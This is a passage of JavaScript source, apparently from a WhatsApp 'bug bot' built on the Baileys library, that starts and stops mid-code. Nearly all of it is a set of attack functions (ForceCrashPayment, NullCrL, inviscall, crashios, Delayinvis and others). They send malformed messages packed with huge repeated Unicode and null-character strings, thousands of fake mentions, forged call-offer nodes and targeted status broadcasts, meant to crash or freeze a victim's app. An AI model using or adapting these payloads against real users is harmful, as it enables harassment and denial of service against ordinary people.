      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135559098@s.whatsapp.net"]
      },
      packDescription: "ꦽ".repeat(80000),
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}
async function ForceCrashPayment(target) {
    try {
        await conn.relayMessage(target, {
            requestPaymentMessage: {
                currencyCodeIso4217: 'IDR',
                requestFrom: target, 
                expiryTimestamp: 0, 
                amount: 1,
                contextInfo: {
                   mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`),
                remoteJid: target,
                participants: target,
                forwarded: true,
                forwardingScore: 9999,
                    externalAdReply: {
                        title: null,
                        body: null,
                        mimetype: 'audio/mpeg',
                        caption: null,
                        showAdAttribution: true,
                        sourceUrl: null,
                        thumbnailUrl: null
                    }
                }
            }
        }, {
            quoted: null
        });

        console.log(chalk.blue.bold(`𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙁𝙤𝙧𝙘𝙚𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤 ${target}`));
    } catch (error) {
    }
}
async function InvisibleSletterCrash(target) {
await conn.relayMessage(target, {
callLogMesssage: { isVideo: true, callOutcome: "REJECTED", durationSecs: "1", callType: "VOICE_CHAT", participants: [{ jid: target, callOutcome: "CONNECTED" }, { jid: "0@s.whatsapp.net", callOutcome: "CONNECTED" }]}
}, {})
}
async function NullCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '\u0000𑇂𑆵𑆴𑆿'.repeat(15000) 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: "(〄) - 𝘼𝙧𝙨𝙮𝙞𝙡𝘾𝙮𝙣𝙭𝙤 𝙄𝙣 𝙔𝙤𝙪𝙧𝙚 𝙎𝙚𝙡𝙛",
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.from("hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=", 'base64'),
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: Buffer.from("2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=", 'base64'),
                    fileEncSha256: Buffer.from("ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=", 'base64'),
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAABAgMEAAYBAQEBAQEAAAAAAAAAAAAAAAECAAME/9oADAMBAAIQAxAAAADzdDWO8UfmAWtPTMuiadryWmzWFHmpKGGfRKk1Mxsy23nzNDlF8endFRS4gDSRwcWVh//EACIQAAICAgICAgMAAAAAAAAAAAECABEDEiExQVEEIhBhgf/aAAgBAQABPwCBI1LLs9Sh/ZrNYVIirYiAzl2NCKrE9QJ9xzDiljUiM2wMU1URlDczUDISOjBj54MyUCCBAduC0dNevwk01omAbuFBisPPYiMtHzGNfZRGy7KI6+YgImVxPjAEsT64gQMtqeR2JiRnYjox7TFr+4lMwBmVQF4mIqRVTK1vMBOyTJixqXIcX6m9PZmTKXMB5uM9rEJqN3EdlFCHY1coe4a8QD3KNQNCZzcJliXLhM//xAAbEQACAgMBAAAAAAAAAAAAAAAAAQIQETFBIP/aAAgBAgEBPwBypyx0TZJJ1sR2sDWvP//EAB4RAAICAgIDAAAAAAAAAAAAAAABAhESMSEiMkFR/9oACAEDAQE/AIw+jdvjRCOS0ShGtkG0jrkyM6bXolT0cJJJmTtseyL8i7RVIdCxo//Z", 'base64'),
                    scansSidecar: Buffer.from("AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==", 'base64'),
                    scanLengths: [ 5657, 38661, 12072, 27792 ]
                  },
                  hasMediaAttachment: true
                },
                body: { 
                  text: "(〄) - MutanoX | just begginer" + "\u0000𑇂𑆵𑆴𑆿".repeat(15000)
                },
                footer: {
                  text: "package-lock.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\u0003".repeat(15000)
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`),
            participant: [target],
            isGroupMention: true,
            quotedMessage: {
              contactMessage: {
                displayName: "MutanoX",
                vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:Admin\nEND:VCARD',
                clientUrl: null,
                serverUrl: null
              }
            }
          }
        }
      }
    }
  }, { remoteJid: "0@broadcast" });

  await conn.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function inviscall(conn, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Setto Kill You!" + "ោ".repeat(500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission",
            paramsJson: "\r".repeat(1020000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 1000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function ArsyilCynxoForceAwet(conn, target) {
  try {
    console.log(chalk.red(`MENGIRIMKAN PAKET CRASH KE ${target} 👻🗡`));
    const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
    let devices = (await conn.getUSyncDevices([target], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await conn.assertSessions(devices);
    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch { }
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };
    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = conn.createParticipantNodes.bind(conn);
    let yntkts = conn.encodeWAMessage?.bind(conn);
    conn.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
      let patched = await (conn.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
      let { id: meId, lid: meLid } = conn.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;
      let nodes = await Promise.all(
        ywdh.map(async ({ recipientJid: jid, message: msg }) => {
          let { user: targetUser } = jidDecode(jid);
          let { user: ownPnUser } = jidDecode(meId);
          let isOwnUser = targetUser === ownPnUser || targetUser === omak;
          let y = jid === meId || jid === meLid;
          if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
          let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
          return memek.mutex(jid, async () => {
            let { type, ciphertext } = await conn.signalRepository.encryptMessage({ jid, data: bytes });
            if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
            return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
          });
        })
      );
      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };
    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(10000, 0x01)]);
    let { nodes: destinations, shouldIncludeDeviceIdentity } = await conn.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
    let expensionNode = {
      tag: "call",
      attrs: { to: target, id: conn.generateMessageTag(), from: conn.user.id },
      content: [{
        tag: "offer",
        attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": conn.user.id },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(conn.authState.creds.account, true) }] : [])
        ]
      }]
    };
    await conn.sendNode(expensionNode);
    await new Promise(resolve => setTimeout(resolve, 1000));
  } catch (error) { }
}
async function ArsyilCynxoBetaFC(conn, target) {
console.log(chalk.red("Succesfully Attack"));
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await conn.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await conn.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = conn.createParticipantNodes.bind(conn);
    let yntkts = conn.encodeWAMessage?.bind(conn);

    conn.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (conn.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = conn.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await conn.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await conn.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: conn.generateMessageTag(),
            from: conn.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": conn.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(conn.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    await conn.sendNode(expensionNode);
}
async function CrashXFreeze(target) {
  try {
    let bugpayment = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: target,
        expiryTimestamp: 0,
        amount: 1
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`),
        remoteJid: target,
        forwarded: true,
        forwardingScore: 9999,
        externalAdReply: {
          title: 'papapipi!',
          body: '\u0000'.repeat(50000),
          mimetype: 'image/jpeg',
          caption: '⿻⭑‌⟅ ༑ ▾ SETTOKILL ⿻ MAMPUS⿻ ▾ ༑‌⟆⭑⿻',
          showAdAttribution: false,
          sourceUrl: 't.me/settoganteng',
          thumbnailUrl: 'https://files.catbox.moe/c7wlb0.jpg'
        }
      }
    };
    let message = await conn.relayMessage(target, bugpayment, {
      participant: { jid: target },
      quoted: fquoted
    });
    console.log(chalk.blue.bold(`𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙁𝙤𝙧𝙘𝙚𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤 ${target}`));
    await conn.sendMessage(target, { delete: message.key });
  } catch (error) {
  }
}
async function crashios(target, mention) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await conn.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

async function Delayinvis(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await conn.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 

async function Delayinvisv2(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉